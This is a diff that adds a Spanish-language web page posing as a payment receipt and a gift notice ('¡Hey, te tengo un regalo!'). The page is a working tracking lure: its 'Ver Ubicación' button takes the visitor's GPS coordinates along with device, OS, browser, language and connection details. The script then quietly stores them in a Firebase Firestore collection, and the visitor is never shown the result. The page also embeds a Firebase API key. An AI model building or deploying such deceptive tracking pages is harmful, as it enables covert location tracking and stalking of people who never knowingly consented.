@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprobante de transferencia</title>
+    <meta name="description" content="Obtener coordenadas GPS">
+    <meta name="keywords" content="GPS, coordenadas">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Advent+Pro:wght@200;400;500;600&family=Alfa+Slab+One&family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    
+    <!-- Incluye Firebase JavaScript SDK -->
+   
+
+    <style>
+        /* Estilos para el cuerpo de la página */
+        body {
+            font-family: 'Montserrat', Arial, sans-serif;
+            background-color: #161616;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center !important;
+        }
+
+        /* Estilos para el encabezado */
+        h1 {
+            color: #F0F0F0;
+            font-size: 35px;
+            margin-bottom: 10px; 
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 900;
+        }
+
+        /* Estilos para el subencabezado */
+        h2 {
+            color: #b1b1b1;
+            font-size: 20px;
+            margin-top: 10px;
+        }
+
+        /* Estilos para el botón */
+        button {
+            background-color: #ff4735; /* Cambié el color del botón ff6f61 */
+            color: white;
+            padding: 18px 32px; /* Aumenté el padding para hacerlo más grande */
+            font-size: 22px; /* Aumenté el tamaño de fuente */
+            border: none;
+            border-radius: 8px; /* Mayor radio para bordes redondeados */
+            cursor: pointer;
+            transition: background-color 0.3s;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2); /* Añadí sombra */
+            z-index: 1000;
+        }
+
+        button:hover {
+            background-color: #ff6f61; /* Cambié el color al pasar el mouse ff4735 */
+        }
+
+        /* Estilos para la imagen */
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-top: -30px;
+            
+            width: 400px;
+        }
+    
+        /* Estilos para la imagen con efecto neon */
+        .neon-image-container {
+            margin: 25px;
+            display: inline-block;
+            position: relative;
+        }
+
+        .neon-image {
+            max-width: 100%;
+            height: auto;
+            animation: neonAnimation 4s linear infinite;
+        }
+
+        @keyframes neonAnimation {
+            0% {
+                filter: drop-shadow(0 0 100px rgba(0, 255, 0, .7)) brightness(1.2);
+            }
+            25% {
+                filter: drop-shadow(0 0 100px rgba(0, 0, 255, .7)) brightness(1.2);
+            }
+            50% {
+                filter: drop-shadow(0 0 100px rgba(255, 0, 0, .7)) brightness(1.2);
+            }
+            75% {
+                filter: drop-shadow(0 0 100px rgba(0, 255, 0, .7)) brightness(1.2);
+            }
+            100% {
+                filter: drop-shadow(0 0 100px rgba(0, 0, 255, .7)) brightness(1.2);
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>ENVÍA Y RECIBE REGALOS</h1>
+
+  
+    <h2>🎀¡Hey, te tengo un regalo!🎁 </h2>
+      <!-- Imagen con efecto neon -->
+       <!-- Contenedor de la imagen con efecto neon -->
+    <div class="neon-image-container">
+        <img class="neon-image" src="https://firebasestorage.googleapis.com/v0/b/tuncardev-e0edd.appspot.com/o/BANCOS%2FNFT-Art-PNG-Pic-min.png?alt=media&token=8a929e9c-6a1a-44b7-ae6a-4c96c5a86873&_gl=1*104wgmh*_ga*MzQyNDg2NTE5LjE2NjU0MTkwODM.*_ga_CW55HF8NVT*MTY5NjE4OTA1Ny4xNTMuMS4xNjk2MTkwMjgzLjIuMC4w"
+            alt="Comprobante de pago">
+    </div>
+    <h2 
+    style="margin-top: -100px;"
+    >Mira dónde te enviaron el regalo </h2>
+    <!-- Botón con el texto personalizado -->
+    <button id="verUbicacion">Ver Ubicación 😊</button>
+  <!--
+    <p>Latitud: <span id="latitud"></span></p>
+    <p>Longitud: <span id="longitud"></span></p>
+   -->
+   
+    <!-- JavaScript para asignar el evento click al botón -->
+<script type="module">
+    // Importa las bibliotecas de Firebase que necesitas
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js'
+    import { getAuth } from 'https://www.gstatic.com/firebasejs/10.4.0/firebase-auth.js'
+    import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.4.0/firebase-firestore.js'
+
+    // TODO: Reemplaza con la configuración de tu proyecto de Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyCTjrgZdHp6Zeya3oNiV0jSZe-9yd8ZT_o",
+        authDomain: "tuncardev-e0edd.firebaseapp.com",
+        projectId: "tuncardev-e0edd",
+        storageBucket: "tuncardev-e0edd.appspot.com",
+        messagingSenderId: "212461555522",
+        appId: "1:212461555522:web:3798695109ca01a49702db"
+    };
+
+
+    // Inicializa Firebase con la configuración
+       // Inicializa Firebase con la configuración
+       const app = initializeApp(firebaseConfig);
+
+// Obtiene las instancias de Firebase que necesitas
+const auth = getAuth();
+const db = getFirestore();
+
+const botonVerUbicacion = document.getElementById('verUbicacion');
+
+function obtenerCoordenadas() {
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            var latitud = position.coords.latitude;
+            var longitud = position.coords.longitude;
+            
+            document.getElementById("latitud").textContent = latitud;
+            document.getElementById("longitud").textContent = longitud;
+
+            // Obtener información del sistema operativo, tipo de dispositivo, orientación, etc.
+            const sistemaOperativo = obtenerSistemaOperativo();
+            const tipoDispositivo = obtenerTipoDispositivo();
+            const orientacionDispositivo = obtenerOrientacionDispositivo();
+            const navegador = obtenerNavegador();
+            const idiomaSistemaOperativo = obtenerIdiomaSistemaOperativo();
+            const tipoConexionInternet = obtenerTipoConexionInternet();
+            const plataformaSistemaOperativo = obtenerPlataformaSistemaOperativo();
+            const soporteCookies = obtenerSoporteCookies();
+
+            // Guarda la información en Firestore
+            guardarInformacionEnFirestore(latitud, longitud, sistemaOperativo, tipoDispositivo, orientacionDispositivo, navegador, idiomaSistemaOperativo, tipoConexionInternet, plataformaSistemaOperativo, soporteCookies);
+        });
+    } else {
+        // Mensaje personalizado en lugar de la alerta predeterminada
+        var mensaje = "Lo siento, la geolocalización no es compatible en este navegador.";
+        document.getElementById("latitud").textContent = "N/A";
+        document.getElementById("longitud").textContent = "N/A";
+        alert(mensaje);
+    }
+}
+
+// Función para obtener el nombre del sistema operativo
+function obtenerSistemaOperativo() {
+    const userAgent = navigator.userAgent;
+    if (userAgent.includes("Windows")) {
+        return "Windows";
+    } else if (userAgent.includes("Mac OS")) {
+        return "Mac OS";
+    } else if (userAgent.includes("Linux")) {
+        return "Linux";
+    } else {
+        return "Otro";
+    }
+}
+
+// Función para determinar el tipo de dispositivo
+function obtenerTipoDispositivo() {
+    const esMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    return esMovil ? "Móvil" : "Escritorio/Tableta";
+}
+
+// Función para determinar la orientación del dispositivo
+function obtenerOrientacionDispositivo() {
+    return window.orientation === 0 ? "Vertical" : "Horizontal";
+}
+
+// Función para obtener el nombre del navegador web
+function obtenerNavegador() {
+    return navigator.appName;
+}
+
+// Función para obtener el idioma del sistema operativo
+function obtenerIdiomaSistemaOperativo() {
+    return navigator.language;
+}
+
+// Función para determinar el tipo de conexión a Internet
+function obtenerTipoConexionInternet() {
+    return navigator.connection.effectiveType;
+}
+
+// Función para obtener la plataforma del sistema operativo
+function obtenerPlataformaSistemaOperativo() {
+    return navigator.platform;
+}
+
+// Función para determinar el soporte para cookies
+function obtenerSoporteCookies() {
+    return navigator.cookieEnabled ? "Habilitadas" : "Deshabilitadas";
+}
+
+// Función para guardar información en Firestore
+async function guardarInformacionEnFirestore(latitud, longitud, sistemaOperativo, tipoDispositivo, orientacionDispositivo, navegador, idiomaSistemaOperativo, tipoConexionInternet, plataformaSistemaOperativo, soporteCookies) {
+    try {
+        // Agrega un documento con la información a la colección "InformacionUsuario"
+        const docRef = await addDoc(collection(db, 'InformacionUsuario'), {
+            latitud: latitud,
+            longitud: longitud,
+            sistemaOperativo: sistemaOperativo,
+            tipoDispositivo: tipoDispositivo,
+            orientacionDispositivo: orientacionDispositivo,
+            navegador: navegador,
+            idiomaSistemaOperativo: idiomaSistemaOperativo,
+            tipoConexionInternet: tipoConexionInternet,
+            plataformaSistemaOperativo: plataformaSistemaOperativo,
+            soporteCookies: soporteCookies
+        });
+        console.log('Información guardada con ID: ', docRef.id);
+    } catch (e) {
+        console.error('Error al guardar información: ', e);
+    }
+}
+
+// Asigna el evento click al botón
+botonVerUbicacion.addEventListener('click', obtenerCoordenadas);
+</script>
+</body>
+</html>
